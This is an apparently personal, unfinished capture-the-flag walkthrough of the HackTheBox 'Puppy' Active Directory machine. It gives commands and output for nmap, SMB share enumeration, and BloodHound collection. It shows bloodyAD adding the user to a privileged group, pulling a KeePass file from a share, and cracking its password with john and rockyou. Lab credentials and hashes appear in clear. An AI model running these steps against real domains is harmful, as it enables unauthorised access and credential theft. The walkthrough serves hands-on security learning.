@@ -1,0 +1,327 @@
+Note : While I was do these boxes I set up a timer and when it finishes I  stop . I had reached a certain point and next the morning the box was premium so it's incomplete.
+
+# We are given these Credentials to begin with:
+
+// credentals ==  levi.james:KingofAkron2025!
+__________________________________________________________________________________________________________________________________________________________________________________________________________________
+# First as usual we do a nmap scan 
+*** Nmap
+nmap -p- -A --min-rate=1000 -o initialscan.txt 10.10.11.70
+Nmap scan report for 10.10.11.70
+Host is up (0.090s latency).
+Not shown: 65512 filtered tcp ports (no-response)
+Bug in iscsi-info: no string output.
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-10 14:17:08Z)
+111/tcp   open  rpcbind       2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/tcp6  rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  2,3,4        111/udp6  rpcbind
+|   100003  2,3         2049/udp   nfs
+|   100003  2,3         2049/udp6  nfs
+|   100005  1,2,3       2049/udp   mountd
+|   100005  1,2,3       2049/udp6  mountd
+|   100021  1,2,3,4     2049/tcp   nlockmgr
+|   100021  1,2,3,4     2049/tcp6  nlockmgr
+|   100021  1,2,3,4     2049/udp   nlockmgr
+|   100021  1,2,3,4     2049/udp6  nlockmgr
+|   100024  1           2049/tcp   status
+|   100024  1           2049/tcp6  status
+|   100024  1           2049/udp   status
+|_  100024  1           2049/udp6  status
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+2049/tcp  open  nlockmgr      1-4 (RPC #100021)
+3260/tcp  open  iscsi?
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        .NET Message Framing
+49664/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  msrpc         Microsoft Windows RPC
+49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49698/tcp open  msrpc         Microsoft Windows RPC
+59329/tcp open  msrpc         Microsoft Windows RPC
+65323/tcp open  msrpc         Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
+OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
+Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2025-10-10T14:19:06
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+|_clock-skew: 6h33m11s
+TRACEROUTE (using port 445/tcp)
+HOP RTT      ADDRESS
+1   88.71 ms 10.10.14.1
+2   88.76 ms 10.10.11.70
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Oct 10 03:46:38 2025 -- 1 IP address (1 host up) scanned in 299.17 seconds
+
+#upon analyzing nmap we can see it's obviously and AD lab , it give us an domain name that we reslove in /etc/hosts
+ ┌──(kali㉿kali)-[~/HAckthebox/Puppy]
+└─$ sudo nano /etc/hosts
+# so next up we list the shares 
+__________________________________________________________________________________________________________________________________________________________________________________________________________________
+
+***nxc smb
+# initials
+
+┌──(kali㉿kali)-[~/HAckthebox/Puppy]
+└─$ nxc smb PUPPY.HTB -u levi.james -p KingofAkron2025!  --shares
+
+SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.
+SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! 
+SMB         10.10.11.70     445    DC               [*] Enumerated shares
+SMB         10.10.11.70     445    DC               Share           Permissions     Remark
+SMB         10.10.11.70     445    DC               -----           -----------     ------
+SMB         10.10.11.70     445    DC               ADMIN$                          Remote Admin
+SMB         10.10.11.70     445    DC               C$                              Default share
+SMB         10.10.11.70     445    DC               DEV                             DEV-SHARE for PUPPY-DEVS
+SMB         10.10.11.70     445    DC               IPC$            READ            Remote IPC
+SMB         10.10.11.70     445    DC               NETLOGON        READ            Logon server share 
+SMB         10.10.11.70     445    DC               SYSVOL          READ            Logon server share 
+
+#here we find out the shares and permisssions we have over the shares
+__________________________________________________________________________________________________________________________________________________________________________________________________________________
+
+***Bloodhound
+#now we go and make a zip file for bloodhound :
+ bloodhound-python  -u levi.james -p 'KingofAkron2025!' -ns 10.129.81.186 -d 10.129.81.186 -d puppy.htb -c all --zip
+#which gives us : 20251010035836_bloodhound.zip  a file like that
+#while making the zip file we found a new domain so :put these [ 10.129.81.186 dc.puppy.htb puppy.htb ] in /etc/hosts
+__________________________________________________________________________________________________________________________________________________________________________________________________________________
+
+ Starting bloodhound
+
+[debugging]
+__________________________________________________________________________________________________________________________________________________________________________________________________________________
+
+#start docker : sudo systemctl start docker
+
+# check : docker ps [If you get == Got permission denied while trying to connect to the Docker daemon socket or Cannot connect to the Docker daemon at unix:///var/run/docker.sock]
+ use == sudo usermod -aG docker $USER
+        newgrp docker
+        docker ps
+now start bloodhound :
+./bloodhound-cli up
+__________________________________________________________________________________________________________________________________________________________________________________________________________________
+I faced these : 
+_______________
+
+[problem]
+ : └─$ ./bloodhound-cli up
+[+] Checking the status of Docker and the Compose plugin...
+[+] Docker and the Compose plugin checks have passed
+[+] Bringing up the BloodHound environment
+[+] Running `docker` to bring up the containers with /home/kali/.config/bloodhound/docker-compose.yml...
+2025/10/10 04:05:04 The YAML file /home/kali/.config/bloodhound/docker-compose.yml does not exist! To continue, move your YAML file into the config directory or run `./bloodhound-cli check` to download the necessar>
+
+
+[remedy]
+┌──(kali㉿kali)-[~/bloodhound]
+└─$ ./bloodhound-cli check
+
+[+] Checking the status of Docker and the Compose plugin...
+[+] Docker and the Compose plugin checks have passed
+[+] Checking for the Docker YAML files...
+[+] Downloading the production YAML file from https://raw.githubusercontent.com/SpecterOps/BloodHound_CLI/refs/heads/main/docker-compose.yml...
+[+] Downloading the development YAML file from https://raw.githubusercontent.com/SpecterOps/BloodHound_CLI/refs/heads/main/docker-compose.dev.yml...
+[+] Environment checks are complete!
+__________________________________________________________________________________________________________________________________________________________________________________________________________________
+
+#then :
+ ┌──(kali㉿kali)-[~/bloodhound]
+└─$ ./bloodhound-cli up
+
+// I forgot my password
+┌──(kali㉿kali)-[~/bloodhound]
+└─$ ./bloodhound-cli resetpwd
+
+#don't forget your passwordS
+
+# now in the bloodhound UI upload the zip file and then search for outbound object control that suggest that there's DEVELOPERS
+__________________________________________________________________________________________________________________________________________________________________________________________________________________
+//so we try to push our user in that group , we use bloody AD for that
+
+[BloodyAD]
+
+#command
+┌──(kali㉿kali)-[~/HAckthebox/Puppy]
+└─$ bloodyAD --host 10.10.11.70 -d pupppy.htb -u levi.james -p KingofAkron2025! add groupMember "DEVELOPERS" "levi.james"
+[+] levi.james added to DEVELOPERS
+__________________________________________________________________________________________________________________________________________________________________________________________________________________
+
+now we enumerate shares again and get the read permission on dev as well
+    # after promoting the user into developers group 
+
+┌──(kali㉿kali)-[~/HAckthebox/Puppy]
+└─$ nxc smb PUPPY.HTB -u levi.james -p KingofAkron2025!  --shares
+
+SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.
+SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! 
+SMB         10.10.11.70     445    DC               [*] Enumerated shares
+SMB         10.10.11.70     445    DC               Share           Permissions     Remark
+SMB         10.10.11.70     445    DC               -----           -----------     ------
+SMB         10.10.11.70     445    DC               ADMIN$                          Remote Admin
+SMB         10.10.11.70     445    DC               C$                              Default share
+SMB         10.10.11.70     445    DC               DEV             READ            DEV-SHARE for PUPPY-DEVS
+SMB         10.10.11.70     445    DC               IPC$            READ            Remote IPC
+SMB         10.10.11.70     445    DC               NETLOGON        READ            Logon server share 
+SMB         10.10.11.70     445    DC               SYSVOL          READ            Logon server share 
+                                                                                               
+//then we use smbclient to get those files
+__________________________________________________________________________________________________________________________________________________________________________________________________________________
+***SMB-Client
+
+#logging in
+└─$ smbclient \\\\puppy.htb\\DEV -U levi.james
+Password for [WORKGROUP\levi.james]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                  DR        0  Sun Mar 23 03:07:57 2025
+  ..                                  D        0  Sat Mar  8 11:52:57 2025
+  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 03:09:12 2025
+  Projects                            D        0  Sat Mar  8 11:53:36 2025
+  recovery.kdbx                       A     2677  Tue Mar 11 22:25:46 2025
+
+                                5080575 blocks of size 4096. 1612016 blocks available
+smb: \> get  KeePassXC-2.7.9-Win64.msi
+
+        
+#downloadin the files
+                                                                                                                    
+┌──(kali㉿kali)-[~/HAckthebox/Puppy]
+└─$ smbclient \\\\puppy.htb\\DEV -U levi.james
+Password for [WORKGROUP\levi.james]:
+Try "help" to get a list of possible commands.
+smb: \> get recovery.kdbx
+getting file \recovery.kdbx of size 2677 as recovery.kdbx (6.8 KiloBytes/sec) (average 6.8 KiloBytes/sec)
+smb: \> The connection is disconnected now: NT_STATUS_CONNECTION_DISCONNECTED
+__________________________________________________________________________________________________________________________________________________________________________________________________________________
+
+# since it's a kbdx file we use keepassxc to open the file
+
+┌──(kali㉿kali)-[~/HAckthebox/Puppy]
+└─$ sudo apt install keepassxc
+
+//we found out that the file is password protected so we must crack it but
+
+[we run into this error]
+┌──(kali㉿kali)-[~/HAckthebox/Puppy]
+└─$ keepass2john recovery.kdbx > forjohn.hash
+! recovery.kdbx : File version '40000' is currently not supported!
+
+[it means that this doesn't support keepass so we need john-the-ripper]
+__________________________________________________________________________________________________________________________________________________________________________________________________________________
+
+# downloading john the ripper 
+[Note : all of these are necessary, well for me it was]
+                                                                                                                                                                                                                      >
+kali㉿kali)-[~/HAckthebox/Puppy]
+└─$ sudo apt install -y snapd
+
+snapd is already the newest version (2.68.3-3+b2).
+The following packages were automatically installed and are no longer required:
+  amass-common      libjs-jquery-ui     libmongocrypt0  librav1e0.7    libudfread0  libyelp0               python3-gpg                           python3-kismetcapturertl433   python3-zombie-imp  samba-dsdb-modules
+  libbluray2        libjs-underscore    libplacebo349   libtheoradec1  libx264-164  python3-bluepy         python3-kismetcapturebtgeiger         python3-kismetcapturertladsb  samba-ad-dc
+  libbson-1.0-0t64  libmongoc-1.0-0t64  libportmidi0    libtheoraenc1  libxml2      python3-click-plugins  python3-kismetcapturefreaklabszigbee  python3-kismetcapturertlamr   samba-ad-provision
+Use 'sudo apt autoremove' to remove them.
+
+Summary:
+  Upgrading: 0, Installing: 0, Removing: 0, Not Upgrading: 136
+
+_________________________________________________________________________________________________________________________                                                                                             >
+┌──(kali㉿kali)-[~/HAckthebox/Puppy]
+└─$ sudo systemctl enable --now snapd.socket
+
+Created symlink '/etc/systemd/system/sockets.target.wants/snapd.socket' → '/usr/lib/systemd/system/snapd.socket'.
+_________________________________________________________________________________________________________________________                                                                                             >
+┌──(kali㉿kali)-[~/HAckthebox/Puppy]
+└─$ sudo snap install core
+
+2025-10-10T04:38:22-04:00 INFO Waiting for automatic snapd restart...
+core 16-2.61.4-20250626 from Canonical✓ installed
+WARNING: There is 1 new warning. See 'snap warnings'.
+_________________________________________________________________________________________________________________________                                                                                             >
+┌──(kali㉿kali)-[~/HAckthebox/Puppy]
+└─$ sudo snap install john-the-ripper
+
+
+2025-10-10T04:39:15-04:00 INFO Waiting for automatic snapd restart...
+john-the-ripper v1.9.1-ce from Claudio André (claudioandre-br) installed
+WARNING: There is 1 new warning. See 'snap warnings'.
+
+(Note : all of these are necessary, well for me it was)
+______________________________________________________________________________________________________________________________________________________________________________________________________________________>
+[now convert the hash ]
+                                                                                                                                                                                                                      >
+┌──(kali㉿kali)-[~/HAckthebox/Puppy]
+└─$ /snap/bin/john-the-ripper.keepass2john recovery.kdbx
+
+recovery:$keepass$*4*37*ef636ddf*67108864*19*4*bf70d9925723ccf623575d62e4c4fb590a2b2b4323ac35892cf2662853527714*d421b15d6c79e29ecb70c8e1c2e92b4b27dc8d9ae6d8107292057feb92441470*03d9a29a67fb4bb500000400021000000031c>
+_________________________________________________________________________________________________________________________
+[copy the hash]
+┌──(kali㉿kali)-[~/HAckthebox/Puppy]
+└─$ cat john.hash
+$keepass$*4*37*ef636ddf*67108864*19*4*bf70d9925723ccf623575d62e4c4fb590a2b2b4323ac35892cf2662853527714*d421b15d6c79e29ecb70c8e1c2e92b4b27dc8d9ae6d8107292057feb92441470*03d9a29a67fb4bb500000400021000000031c1f2e6bf71>
+
+[This will fail ]
+┌──(kali㉿kali)-[~/HAckthebox/Puppy]
+└─$  /snap/bin/john-the-ripper --wordlist=/usr/share/wordlists/rockyou.txt john.hash --format=KeePass
+Using default input encoding: UTF-8
+Loaded 1 password hash (KeePass [AES/Argon2 256/256 AVX2])
+Cost 1 (t (rounds)) is 37 for all loaded hashes
+Cost 2 (m) is 65536 for all loaded hashes
+Cost 3 (p) is 4 for all loaded hashes
+Cost 4 (KDF [0=Argon2d 2=Argon2id 3=AES]) is 0 for all loaded hashes
+Will run 4 OpenMP threads
+Note: Passwords longer than 41 [worst case UTF-8] to 124 [ASCII] rejected
+fopen: /usr/share/wordlists/rockyou.txt: No such file or directory
+
+[It fails because the new version limits it's space and doesn't look at the files outside it so we copy the wordlist in the current directory]
+_________________________________________________________________________________________________________________________
+┌──(kali㉿kali)-[~/HAckthebox/Puppy]
+└─$ cp /usr/share/wordlists/rockyou.txt ./
+
+[We can now crack the password ]
+______________________________________________________________________________________________________________________________________________________________________________________________________________________
+                                                                                                                                                                                                                      >
+┌──(kali㉿kali)-[~/HAckthebox/Puppy]
+└─$ /snap/bin/john-the-ripper --wordlist=rockyou.txt john.hash --format=KeePass
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (KeePass [AES/Argon2 256/256 AVX2])
+Cost 1 (t (rounds)) is 37 for all loaded hashes
+Cost 2 (m) is 65536 for all loaded hashes
+Cost 3 (p) is 4 for all loaded hashes
+Cost 4 (KDF [0=Argon2d 2=Argon2id 3=AES]) is 0 for all loaded hashes
+Will run 4 OpenMP threads
+Note: Passwords longer than 41 [worst case UTF-8] to 124 [ASCII] rejected
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+liverpool        (?)
+1g 0:00:01:19 DONE (2025-10-10 05:00) 0.01252g/s 0.4506p/s 0.4506c/s 0.4506C/s purple..liverpool
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+                                           
